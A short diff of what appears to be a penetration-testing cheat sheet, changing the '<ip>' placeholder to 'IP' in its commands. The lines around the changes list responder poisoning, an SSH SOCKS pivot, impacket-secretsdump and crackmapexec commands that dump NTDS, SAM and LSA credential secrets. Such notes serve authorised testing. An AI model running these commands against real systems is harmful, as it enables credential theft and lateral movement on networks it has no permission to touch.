@@ -36,7 +36,7 @@ responder -I eth0 -wbFP
 # SSH Tunneling
 
 ### Socks proxy
-ssh -D 8080 root@<ip>
+ssh -D 8080 root@IP
 
 Set Firefox network settings to use socks5 proxy 127.0.0.1 8080, must remove the HTTP proxy
 
@@ -46,10 +46,10 @@ Set Firefox network settings to use socks5 proxy 127.0.0.1 8080, must remove the
 
 impacket-secretsdump DOMAIN/user:password@IP -history -outputfile output
 
-crackmapexec smb <ip> -u user -p password --ntds
+crackmapexec smb IP -u user -p password --ntds
 
 ## Other
 
-crackmapexec smb <ip> -u user -p password --sam
+crackmapexec smb IP -u user -p password --sam
 
-crackmapexec smb <ip> -u user -p password --lsa
+crackmapexec smb IP -u user -p password --lsa
